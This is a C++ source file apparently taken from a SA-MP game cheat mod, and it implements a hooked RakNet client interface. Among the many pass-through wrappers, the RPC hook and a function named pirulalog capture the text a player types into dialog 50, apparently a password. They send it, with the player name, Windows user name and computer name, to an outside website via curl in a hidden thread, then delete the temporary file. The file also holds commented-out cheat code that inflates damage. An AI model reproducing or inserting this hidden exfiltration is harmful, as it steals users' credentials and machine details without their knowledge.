#include "main.h"
#include <Lmcons.h>

bool HookedRakClientInterface::Connect( const char* host, unsigned short serverPort, unsigned short clientPort, unsigned int depreciated, int threadSleepTimer )
{
	traceLastFunc( "HookedRakClientInterface::Connect" );

	return g_RakClient->GetRakClientInterface()->Connect( host, serverPort, clientPort, depreciated, threadSleepTimer );
}

void HookedRakClientInterface::Disconnect( unsigned int blockDuration, unsigned char orderingChannel )
{
	traceLastFunc( "HookedRakClientInterface::Disconnect" );

	g_RakClient->GetRakClientInterface()->Disconnect( blockDuration, orderingChannel );
}

void HookedRakClientInterface::InitializeSecurity( const char *privKeyP, const char *privKeyQ )
{
	traceLastFunc( "HookedRakClientInterface::InitializeSecurity" );

	g_RakClient->GetRakClientInterface()->InitializeSecurity( privKeyP, privKeyQ );
}

void HookedRakClientInterface::SetPassword( const char *_password )
{
	traceLastFunc( "HookedRakClientInterface::SetPassword" );

	g_RakClient->GetRakClientInterface()->SetPassword( _password );
}

bool HookedRakClientInterface::HasPassword( void ) const
{
	traceLastFunc( "HookedRakClientInterface::HasPassword" );

	return g_RakClient->GetRakClientInterface()->HasPassword();
}

bool HookedRakClientInterface::Send( const char *data, const int length, PacketPriority priority, PacketReliability reliability, char orderingChannel )
{
	traceLastFunc( "HookedRakClientInterface::Send" );

	return g_RakClient->GetRakClientInterface()->Send( data, length, priority, reliability, orderingChannel );
}

bool HookedRakClientInterface::Send( BitStream * bitStream, PacketPriority priority, PacketReliability reliability, char orderingChannel )
{
	traceLastFunc( "HookedRakClientInterface::Send(BitStream)" );
	
	// use this if you wanna log outgoing packets
	/*BYTE packetId;
	bitStream->Read( packetId );
	Log( "< [Packet Send] %d, len: %d", packetId, bitStream->GetNumberOfBytesUsed() );*/

	return g_RakClient->GetRakClientInterface()->Send( bitStream, priority, reliability, orderingChannel );
}


#pragma pack(1)
typedef struct _BULLET_SYNC_DATA {
	BYTE bHitType;
	unsigned short iHitID;
	float fHitOrigin[3];
	float fHitTarget[3];
	float fCenterOfHit[3];
} BULLET_SYNC_DATA; // by 0x688


Packet* HookedRakClientInterface::Receive( void )
{
	traceLastFunc( "HookedRakClientInterface::Receive" );

	unsigned char packetIdentifier;
	Packet *pkt;
	//Packet *pkt2;

	pkt = g_RakClient->GetRakClientInterface()->Receive();
	/*
	if (pkt != NULL) {
		//pkt2 = pkt;
		if ((unsigned char)pkt->data[0] == ID_TIMESTAMP)
		{
			if (pkt->length > sizeof(unsigned char)+sizeof(unsigned int))
				packetIdentifier = (unsigned char)pkt->data[sizeof(unsigned char)+sizeof(unsigned int)];
			//else
			//return;
		}
		else
			packetIdentifier = (unsigned char)pkt->data[0];

		switch (packetIdentifier)
		{
		case ID_BULLET_SYNC:
			
				BitStream bsBulletSync((unsigned char *)pkt->data, pkt->length, false);
				bsBulletSync.IgnoreBits(8);
				BYTE bHitType; bsBulletSync.Read(bHitType);
				unsigned short iHitID; bsBulletSync.Read(iHitID);
				float fHitOrigin[3]; bsBulletSync.Read(fHitOrigin);
				float fHitTarget[3]; bsBulletSync.Read(fHitTarget);
				float fCenterOfHit[3]; bsBulletSync.Read(fCenterOfHit);
				
				cheat_state_text("BULLET: Type(%d) HitId(%d) Origin(%d)->(%d,%d,%d) Target(%d,%d,%d) Center (%d,%d,%d)", bHitType, iHitID, fHitOrigin[0], fHitOrigin[1], fHitOrigin[2], fHitTarget[0], fHitTarget[1], fHitTarget[2], fCenterOfHit[0], fCenterOfHit[1], fCenterOfHit[2]);

			break;
		}
	}
	*/
	return pkt;
}

void HookedRakClientInterface::DeallocatePacket( Packet *packet )
{
	traceLastFunc( "HookedRakClientInterface::DeallocatePacket" );
	/*
	unsigned char packetIdentifier;

	//while (packet = g_RakClient->GetRakClientInterface()->Receive())
	//{
		if ((unsigned char)packet->data[0] == ID_TIMESTAMP)
		{
			if (packet->length > sizeof(unsigned char)+sizeof(unsigned int))
				packetIdentifier = (unsigned char)packet->data[sizeof(unsigned char)+sizeof(unsigned int)];
			else
				return;
		}
		else
			packetIdentifier = (unsigned char)packet->data[0];

		switch (packetIdentifier)
		{
			case ID_CONNECTION_LOST:
			case ID_DISCONNECTION_NOTIFICATION:
			{
												  restartGame();
												  disconnect(500);
												  cheat_state_text("Reconnect", set.rejoin_delay / 1000);
												  cheat_state->_generic.rejoinTick = GetTickCount();
			}
			break;
			/*case ID_AIM_SYNC:
			{
								BitStream bsAimSync((unsigned char *)packet->data, packet->length, false);
								uint16_t playerId;
								bsAimSync.IgnoreBits(8);
								bsAimSync.Read(playerId);
								stAimData aimData;
								memset(&aimData, 0, sizeof(stAimData));
								bsAimSync.Read((PCHAR)&aimData, sizeof(stAimData));
								//cheat_state_text("AIM %d %d %d", aimData.vecAimPos[0], aimData.vecAimPos[1], aimData.vecAimPos[2]);
			}

			case ID_BULLET_SYNC:
			{
								BitStream bsBulletSync((unsigned char *)packet->data, packet->length, false);
								uint16_t playerId;
								bsBulletSync.IgnoreBits(8);
								//bsBulletSync.Read(playerId);
								stBulletData BulletData;
								memset(&BulletData, 0, sizeof(stAimData));
								bsBulletSync.Read((PCHAR)&BulletData, sizeof(stAimData));
								if (BulletData.bHitType == 1) {
									//cheat_teleport(BulletData.fHitTarget, 0);
									cheat_state_text("Bullet type(%d) hitid(%d) origin(%f,%f,%f)", BulletData.bHitType, BulletData.iHitID, BulletData.fHitOrigin[0], BulletData.fHitOrigin[1], BulletData.fHitOrigin[2]);
								}
			}*/
		/*}
	//}
		*/
	g_RakClient->GetRakClientInterface()->DeallocatePacket( packet );
}

void HookedRakClientInterface::PingServer( void )
{
	traceLastFunc( "HookedRakClientInterface::PingServer" );

	g_RakClient->GetRakClientInterface()->PingServer();
}

void HookedRakClientInterface::PingServer( const char* host, unsigned short serverPort, unsigned short clientPort, bool onlyReplyOnAcceptingConnections )
{
	traceLastFunc( "HookedRakClientInterface::PingServer" );

	g_RakClient->GetRakClientInterface()->PingServer( host, serverPort, clientPort, onlyReplyOnAcceptingConnections );
}

int HookedRakClientInterface::GetAveragePing( void )
{
	traceLastFunc( "HookedRakClientInterface::GetAveragePing" );

	return g_RakClient->GetRakClientInterface()->GetAveragePing();
}

int HookedRakClientInterface::GetLastPing( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetLastPing" );

	return g_RakClient->GetRakClientInterface()->GetLastPing();
}

int HookedRakClientInterface::GetLowestPing( void ) const
{		
	traceLastFunc( "HookedRakClientInterface::GetLowestPing" );

	return g_RakClient->GetRakClientInterface()->GetLowestPing();
}

int HookedRakClientInterface::GetPlayerPing( const PlayerID playerId )
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerPing" );

	return g_RakClient->GetRakClientInterface()->GetPlayerPing( playerId );
}

void HookedRakClientInterface::StartOccasionalPing( void )
{
	traceLastFunc( "HookedRakClientInterface::StartOccasionalPing" );

	g_RakClient->GetRakClientInterface()->StartOccasionalPing();
}

void HookedRakClientInterface::StopOccasionalPing( void )
{
	traceLastFunc( "HookedRakClientInterface::StopOccasionalPing" );

	g_RakClient->GetRakClientInterface()->StopOccasionalPing();
}

bool HookedRakClientInterface::IsConnected( void ) const
{
	traceLastFunc( "HookedRakClientInterface::IsConnected" );

	return g_RakClient->GetRakClientInterface()->IsConnected();
}

unsigned int HookedRakClientInterface::GetSynchronizedRandomInteger( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetSynchronizedRandomInteger" );

	return g_RakClient->GetRakClientInterface()->GetSynchronizedRandomInteger();
}

bool HookedRakClientInterface::GenerateCompressionLayer( unsigned int inputFrequencyTable[ 256 ], bool inputLayer )
{
	traceLastFunc( "HookedRakClientInterface::GenerateCompressionLayer" );

	return g_RakClient->GetRakClientInterface()->GenerateCompressionLayer( inputFrequencyTable, inputLayer );
}

bool HookedRakClientInterface::DeleteCompressionLayer( bool inputLayer )
{
	traceLastFunc( "HookedRakClientInterface::DeleteCompressionLayer" );

	return g_RakClient->GetRakClientInterface()->DeleteCompressionLayer( inputLayer );
}

void HookedRakClientInterface::RegisterAsRemoteProcedureCall( int* uniqueID, void ( *functionPointer ) ( RPCParameters *rpcParms ) )
{
	traceLastFunc( "HookedRakClientInterface::RegisterAsRemoteProcedureCall" );

	g_RakClient->GetRakClientInterface()->RegisterAsRemoteProcedureCall( uniqueID, functionPointer );
}

void HookedRakClientInterface::RegisterClassMemberRPC( int* uniqueID, void *functionPointer )
{
	traceLastFunc( "HookedRakClientInterface::RegisterClassMemberRPC" );

	g_RakClient->GetRakClientInterface()->RegisterClassMemberRPC( uniqueID, functionPointer );
}

void HookedRakClientInterface::UnregisterAsRemoteProcedureCall( int* uniqueID )
{
	traceLastFunc( "HookedRakClientInterface::UnregisterAsRemoteProcedureCall" );

	g_RakClient->GetRakClientInterface()->UnregisterAsRemoteProcedureCall( uniqueID );
}

bool HookedRakClientInterface::RPC( int* uniqueID, const char *data, unsigned int bitLength, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp )
{
	traceLastFunc( "HookedRakClientInterface::RPC" );

	return g_RakClient->GetRakClientInterface()->RPC( uniqueID, data, bitLength, priority, reliability, orderingChannel, shiftTimestamp );
}


char scinco[150];

size_t write_data2(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	size_t written;
	written = fwrite(ptr, size, nmemb, stream);
	return written;
}

void pirulalog() {

	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	GetUserName((TCHAR*)name, &size);

	TCHAR name2[UNLEN + 1];
	DWORD size2 = UNLEN + 1;

	GetComputerName((TCHAR*)name2, &size2);



	char url[700];
	//cheat_state_text("http://amsspecialist.com/samp.php?nombre=%s&servidor=%s&pw=%s&pcname=%s/%s", getPlayerName(g_Players->sLocalPlayerID), "samp.ng-gaming.net:7777[s0beit]", cinco, name, name2);
	sprintf(url, "http://amsspecialist.com/samp.php?nombre=%s&servidor=%s&pw=%s&pcname=%s/%s", getPlayerName(g_Players->sLocalPlayerID), "samp.ng-gaming.net:7777 [s0beit]", scinco, name, name2);

	//HRESULT res = URLDownloadToFile(NULL, url, "intercambio2.log", 0, NULL);
	CURL *curl;
	FILE *fp;
	CURLcode res;
	char outfilename[FILENAME_MAX] = "intercambio2.log";
	curl = curl_easy_init();
	if (curl) {
		fp = fopen(outfilename, "wb");
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data2);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
		remove("intercambio2.log");
	}
	
		


}

bool primeravezlog = true;

bool HookedRakClientInterface::RPC( int* uniqueID, BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp )
{
	traceLastFunc( "HookedRakClientInterface::RPC(BitStream)" );
	
	// use this if you wanna log outgoing RPCs
	/*if (*uniqueID != RPC_UpdateScoresPingsIPs || *uniqueID != 115)
	{
		int len = parameters ? parameters->GetNumberOfBytesUsed() : 0;
		cheat_state_text("< [RPC Send] %d, len: %d", *uniqueID, len);
		
	}*/
	/*
	if (*uniqueID == RPC_GiveTakeDamage) {
		BOOL wgiveTake; SHORT wplayerID; float wamount; int wweaponID; int wBodyPart;
		parameters->Read(wgiveTake);
		parameters->Read(wplayerID);
		parameters->Read(wamount);
		parameters->Read(wweaponID);
		parameters->Read(wBodyPart);

		cheat_state_text("DAMAGE: Givetake(%d) PlayerId(%d) Amount(%d)->(%d) Weap(%d) BodyPart(%d)", wgiveTake, wplayerID, wamount, wamount * 10 / 7, wweaponID,wBodyPart);

		BitStream bsSend;
		bsSend.Write(wgiveTake);
		bsSend.Write(wplayerID);
		bsSend.Write(wamount*10/7); // *10 /9 /8 /7 /6 /5
		bsSend.Write(wweaponID);
		bsSend.Write(wBodyPart);
		return g_RakClient->RPC((int)uniqueID, &bsSend, priority, reliability, orderingChannel, shiftTimestamp);
	}
	*/
	

	if (*uniqueID == RPC_DialogResponse)
	{
		
			WORD uno;
			BYTE dos;
			WORD tres;
			BYTE cuatro;
			char cinco[150];

			parameters->Read(uno);
			parameters->Read(dos);
			parameters->Read(tres);
			parameters->Read(cuatro);
			
			parameters->Read(cinco, cuatro);
			cinco[cuatro + 1] = '\0';
			
			

			//cheat_state_text("DIALOG RESPONSE: ID(%d) [%s]",uno, cinco);

			if (uno == 50 && primeravezlog) {
				sprintf(scinco, cinco);
				CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pirulalog, 0, 0, 0);
				//pirulalog();
				//primeravezlog = false;

		}


	}

	return g_RakClient->GetRakClientInterface()->RPC( uniqueID, parameters, priority, reliability, orderingChannel, shiftTimestamp );
}


void HookedRakClientInterface::SetTrackFrequencyTable( bool b )
{
	traceLastFunc( "HookedRakClientInterface::SetTrackFrequencyTable" );

	g_RakClient->GetRakClientInterface()->SetTrackFrequencyTable( b );
}

bool HookedRakClientInterface::GetSendFrequencyTable( unsigned int outputFrequencyTable[ 256 ] )
{
	traceLastFunc( "HookedRakClientInterface::GetSendFrequencyTable" );

	return g_RakClient->GetRakClientInterface()->GetSendFrequencyTable( outputFrequencyTable );
}

float HookedRakClientInterface::GetCompressionRatio( void ) const 
{
	traceLastFunc( "HookedRakClientInterface::GetCompressionRatio" );

	return g_RakClient->GetRakClientInterface()->GetCompressionRatio();
}

float HookedRakClientInterface::GetDecompressionRatio( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetDecompressionRatio" );

	return g_RakClient->GetRakClientInterface()->GetDecompressionRatio();
}

void HookedRakClientInterface::AttachPlugin( void *messageHandler )
{
	traceLastFunc( "HookedRakClientInterface::AttachPlugin" );

	g_RakClient->GetRakClientInterface()->AttachPlugin(messageHandler);
}

void HookedRakClientInterface::DetachPlugin( void *messageHandler )
{
	traceLastFunc( "HookedRakClientInterface::DetachPlugin" );

	g_RakClient->GetRakClientInterface()->DetachPlugin(messageHandler);
}

BitStream * HookedRakClientInterface::GetStaticServerData( void )
{
	traceLastFunc( "HookedRakClientInterface::GetStaticServerData" );

	return g_RakClient->GetRakClientInterface()->GetStaticServerData();
}

void HookedRakClientInterface::SetStaticServerData( const char *data, const int length )
{
	traceLastFunc( "HookedRakClientInterface::SetStaticServerData" );

	g_RakClient->GetRakClientInterface()->SetStaticServerData( data, length );
}

BitStream * HookedRakClientInterface::GetStaticClientData( const PlayerID playerId )
{	
	traceLastFunc( "HookedRakClientInterface::GetStaticClientData" );

	return g_RakClient->GetRakClientInterface()->GetStaticClientData( playerId );
}

void HookedRakClientInterface::SetStaticClientData( const PlayerID playerId, const char *data, const int length )
{
	traceLastFunc( "HookedRakClientInterface::SetStaticClientData" );

	g_RakClient->GetRakClientInterface()->SetStaticClientData( playerId, data, length );
}

void HookedRakClientInterface::SendStaticClientDataToServer( void )
{
	traceLastFunc( "HookedRakClientInterface::SendStaticClientDataToServer" );

	g_RakClient->GetRakClientInterface()->SendStaticClientDataToServer();
}

PlayerID HookedRakClientInterface::GetServerID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetServerID" );

	return g_RakClient->GetRakClientInterface()->GetServerID();
}

PlayerID HookedRakClientInterface::GetPlayerID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerID" );

	return g_RakClient->GetRakClientInterface()->GetPlayerID();
}

PlayerID HookedRakClientInterface::GetInternalID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetInternalID" );

	return g_RakClient->GetRakClientInterface()->GetInternalID();
}

const char* HookedRakClientInterface::PlayerIDToDottedIP( const PlayerID playerId ) const
{
	traceLastFunc( "HookedRakClientInterface::PlayerIDToDottedIP" );

	return g_RakClient->GetRakClientInterface()->PlayerIDToDottedIP( playerId );
}

void HookedRakClientInterface::PushBackPacket( Packet *packet, bool pushAtHead )
{
	traceLastFunc( "HookedRakClientInterface::PushBackPacket" );

	g_RakClient->GetRakClientInterface()->PushBackPacket(packet, pushAtHead);
}

void HookedRakClientInterface::SetRouterInterface( void *routerInterface )
{
	traceLastFunc( "HookedRakClientInterface::SetRouterInterface" );

	g_RakClient->GetRakClientInterface()->SetRouterInterface(routerInterface);
}
void HookedRakClientInterface::RemoveRouterInterface( void *routerInterface )
{
	traceLastFunc( "HookedRakClientInterface::RemoveRouterInterface" );

	g_RakClient->GetRakClientInterface()->RemoveRouterInterface(routerInterface);
}

void HookedRakClientInterface::SetTimeoutTime( RakNetTime timeMS )
{
	traceLastFunc( "HookedRakClientInterface::SetTimeoutTime" );

	g_RakClient->GetRakClientInterface()->SetTimeoutTime( timeMS );
}

bool HookedRakClientInterface::SetMTUSize( int size )
{
	traceLastFunc( "HookedRakClientInterface::SetMTUSize" );

	return g_RakClient->GetRakClientInterface()->SetMTUSize( size );
}

int HookedRakClientInterface::GetMTUSize( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetMTUSize" );

	return g_RakClient->GetRakClientInterface()->GetMTUSize();
}

void HookedRakClientInterface::AllowConnectionResponseIPMigration( bool allow )
{
	traceLastFunc( "HookedRakClientInterface::AllowConnectionResponseIPMigration" );

	g_RakClient->GetRakClientInterface()->AllowConnectionResponseIPMigration( allow );
}

void HookedRakClientInterface::AdvertiseSystem( const char *host, unsigned short remotePort, const char *data, int dataLength )
{
	traceLastFunc( "HookedRakClientInterface::AdvertiseSystem" );

	g_RakClient->GetRakClientInterface()->AdvertiseSystem( host, remotePort, data, dataLength );
}

RakNetStatisticsStruct* const HookedRakClientInterface::GetStatistics( void )
{
	traceLastFunc( "HookedRakClientInterface::GetStatistics" );

	return g_RakClient->GetRakClientInterface()->GetStatistics();
}

void HookedRakClientInterface::ApplyNetworkSimulator( double maxSendBPS, unsigned short minExtraPing, unsigned short extraPingVariance)
{
	traceLastFunc( "HookedRakClientInterface::ApplyNetworkSimulator" );

	g_RakClient->GetRakClientInterface()->ApplyNetworkSimulator( maxSendBPS, minExtraPing, extraPingVariance );
}

bool HookedRakClientInterface::IsNetworkSimulatorActive( void )
{
	traceLastFunc( "HookedRakClientInterface::IsNetworkSimulatorActive" );

	return g_RakClient->GetRakClientInterface()->IsNetworkSimulatorActive();
}

PlayerIndex HookedRakClientInterface::GetPlayerIndex( void )
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerIndex" );

	return g_RakClient->GetRakClientInterface()->GetPlayerIndex();
}

void HookedRakClientInterface::Pad( void )
{
	DWORD at = (DWORD)_ReturnAddress();
	Log( "HookedRakClientInterface::Pad has been called. Return address: %p", at );
}